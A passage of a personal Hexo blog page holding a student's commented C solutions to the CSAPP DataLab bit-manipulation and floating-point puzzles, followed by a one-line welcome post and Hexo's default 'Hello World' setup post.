-x == 0，所以 -x 可以通过对 x 取反加1得到。</span></span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//定义两个数.</span></span><br><span class="line">  <span class="comment">//b = high + 大于0x39的数后 符号由0变1 b符号位要为0</span></span><br><span class="line">  <span class="comment">//a = low + 0x30 符号恰好由负变正 a要为正</span></span><br><span class="line">  <span class="comment">// int Tmin = 1 &lt;&lt; 31;</span></span><br><span class="line">  <span class="comment">// int high = Tmin + (~0x3A + 1);//1000···0000 - k 可以不用‘-’实现</span></span><br><span class="line">  <span class="comment">// printf(&quot;high:%x\n&quot;, (unsigned int)high);</span></span><br><span class="line">  <span class="comment">// int low = 0 + (~0x30 + 1);</span></span><br><span class="line">  <span class="comment">// int flag1 = (high + x) &amp; Tmin &gt;&gt; 31;</span></span><br><span class="line">  <span class="comment">// int flag2 = (low + x) &amp; Tmin &gt;&gt; 31; </span></span><br><span class="line">  <span class="comment">// return (!flag1) &amp; flag2;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//用加[-x]的补码实现减法操作</span></span><br><span class="line">  <span class="type">int</span> a = x + (~<span class="number">0x30</span> + <span class="number">1</span>);</span><br><span class="line">  <span class="type">int</span> b = x + (~<span class="number">0x3A</span> + <span class="number">1</span>);</span><br><span class="line">  a &gt;&gt;= <span class="number">31</span>;</span><br><span class="line">  b &gt;&gt;= <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> (!a) &amp; b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> flag = !!x;</span><br><span class="line">  <span class="comment">//0000···0001变为全1, 0为全0</span></span><br><span class="line">  <span class="type">int</span> mask = ~flag + <span class="number">1</span>;<span class="comment">//[0 - x]补</span></span><br><span class="line">  <span class="keyword">return</span> (y &amp; mask) | (z &amp; ~mask);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> flag1 = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> flag2 = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> s = (y + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">//符号相同时且s为0 或 flag1为0且flag2为1 时返回1</span></span><br><span class="line">  <span class="keyword">return</span> (!(flag1 ^ flag2) &amp; !s) | (flag1 &amp; !flag2);</span><br><span class="line">  <span class="comment">//有人说这样当y、x符号不同时直接做差可能会爆int, 应该先判断符号</span></span><br><span class="line">  <span class="comment">// return !((y + (~x + 1)) &gt;&gt; 31);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//只有0 和 Tmin 的补码和自身相同, 其他互为相反数(所以符号位一个是1一个是0)</span></span><br><span class="line">  <span class="comment">//Tmin 和Tmin补码的符号位都为1, 0都为0</span></span><br><span class="line">  <span class="comment">//(x | (~x + 1)) &gt;&gt; 31 结果为全0(if x == 0), 为全1(if x != 0)</span></span><br><span class="line">  <span class="keyword">return</span> ((x | (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// -5 = 1, 00000101</span></span><br><span class="line">  <span class="comment">// 1, 11111011 4&#x27;</span></span><br><span class="line">  <span class="comment">// -1 = 1, 00000001</span></span><br><span class="line">  <span class="comment">// 1, 11111111 1&#x27; = 0 + 1</span></span><br><span class="line">  <span class="comment">// 0x80000000: 1, 00000000 32&#x27; = 31 + 1</span></span><br><span class="line">  <span class="comment">//若x为正数, 找到1的最高位置, 答案所有位数 + 1位符号位; 若为负数, 找到0的最高位置, 所以取反之后和正数处理方法一样</span></span><br><span class="line">  <span class="type">int</span> sign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> b16, b8, b4, b2, b1, b0;</span><br><span class="line">  x = (sign &amp; ~x) | (~sign &amp; x);</span><br><span class="line">  <span class="comment">//二分的思想</span></span><br><span class="line">  b16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;<span class="comment">//若x的高16位中有一位为1, !!(x &gt;&gt; 16)等于1, 否则等于0</span></span><br><span class="line">  x &gt;&gt;= b16;<span class="comment">//若x的高16位中有一位为1, 再在这高16位中继续看高8位;否则, 在低16位中看</span></span><br><span class="line">  b8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  x &gt;&gt;= b8;</span><br><span class="line">  b4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  x &gt;&gt;= b4;</span><br><span class="line">  b2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  x &gt;&gt;= b2;</span><br><span class="line">  b1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  x &gt;&gt;= b1;</span><br><span class="line">  b0 = x;<span class="comment">//如果最后2位中高位无1, 则低位必然是1</span></span><br><span class="line">  <span class="keyword">return</span> b16 + b8 + b4 + b2 + b1 + b0 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> exp = (<span class="number">0x7F800000</span> &amp; uf) &gt;&gt; <span class="number">23</span>;</span><br><span class="line">  <span class="type">unsigned</span> frac = <span class="number">0x7FFFFF</span> &amp; uf;</span><br><span class="line">  <span class="type">unsigned</span> s = uf &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(exp == <span class="number">0xFF</span>) <span class="keyword">return</span> uf;<span class="comment">//特殊值: exp全1, 代表NaN、无穷</span></span><br><span class="line">  <span class="keyword">if</span>(!exp)&#123;</span><br><span class="line">    <span class="comment">//非规格化值,exp全0</span></span><br><span class="line">    frac &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | frac;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//规格化值</span></span><br><span class="line">  exp++;</span><br><span class="line">  <span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | (exp &lt;&lt; <span class="number">23</span>) | frac;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//对规格化值: E = exp - bias &lt; 0, (int)取整后为0</span></span><br><span class="line">  <span class="comment">//  E &gt;= 31, out of range</span></span><br><span class="line">  <span class="type">unsigned</span> s = uf &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="type">unsigned</span> exp = (uf &amp; <span class="number">0x7F800000</span>) &gt;&gt; <span class="number">23</span>;</span><br><span class="line">  <span class="type">unsigned</span> frac = uf &amp; <span class="number">0x7FFFFF</span>;</span><br><span class="line">  <span class="type">int</span> E = exp - <span class="number">127</span>;</span><br><span class="line">  <span class="keyword">if</span>(E &gt;= <span class="number">31</span>) <span class="keyword">return</span>  <span class="number">0x80000000</span>u;<span class="comment">//特殊值exp全1也包括在这种情况内</span></span><br><span class="line">  <span class="keyword">if</span>(E &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//非规格化值exp全0也包括在这种情况内</span></span><br><span class="line">  frac = frac | (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);<span class="comment">//添上隐含1</span></span><br><span class="line">  <span class="comment">//模拟小数点移动</span></span><br><span class="line">  <span class="keyword">if</span>(E &gt;= <span class="number">23</span>) frac &lt;&lt;= E - <span class="number">23</span>;</span><br><span class="line">  <span class="keyword">else</span>  frac &gt;&gt;= <span class="number">23</span> -E;<span class="comment">//舍弃移动后的小数点后面的精度</span></span><br><span class="line">  <span class="keyword">return</span>  s ? -frac : frac;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//(exp - bias127) range : [-126, 127];</span></span><br><span class="line">  <span class="keyword">if</span>(x &gt;= <span class="number">128</span>)  <span class="keyword">return</span> <span class="number">0xFF</span> &lt;&lt; <span class="number">23</span>;<span class="comment">//+INF</span></span><br><span class="line">  <span class="keyword">if</span>(x &lt; <span class="number">-149</span>) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//达到非规格化的最小值: -126 + -23(frac最低位) = -149</span></span><br><span class="line">  <span class="keyword">if</span>(x &lt; <span class="number">-126</span>)  <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; (<span class="number">23</span> - (<span class="number">-126</span> - x));<span class="comment">//非规格化中接近于0的数</span></span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">127</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/03/03/CSAPP-DataLab/" data-id="clerc45ay0000002xaoww1axe" data-title="CSAPP:DataLab" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-欢迎来到我的博客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/03/01/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/" class="article-date">
  <time class="dt-published" datetime="2023-03-01T08:38:44.000Z" itemprop="datePublished">2023-03-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/03/01/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/">欢迎来到我的博客</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>👋，你好。 </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/03/01/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/" data-id="clepfgtia0001452x8bd46edo" data-title="欢迎来到我的博客" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/03/01/hello-world/" class="article-date">
  <time class="dt-published" datetime="2023-03-01T08:17:13.004Z" itemprop="datePublished">2023-03-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/03/01/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/03/01/hello-world/" data-id="clepfgti60000452xgheiekfv" data-title="Hello World" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/03/03/CSAPP-AttackLab/">CSAPP:AttackLab</a>
          </li>
        
          <li>
            <a href="/2023/03/03/CSAPP-BombLab/">CSAPP:BombLab</a>
          </li>
        
          <li>
            <a href="/2023/03/03/CSAPP-DataLab/">CSAPP:DataLab</a>
          </li>
        
          <li>
            <a href="/2023/03/01/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/">欢迎来到我的博客</a>
          </li>
        
          <li>
            <a href="/2023/03/01/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>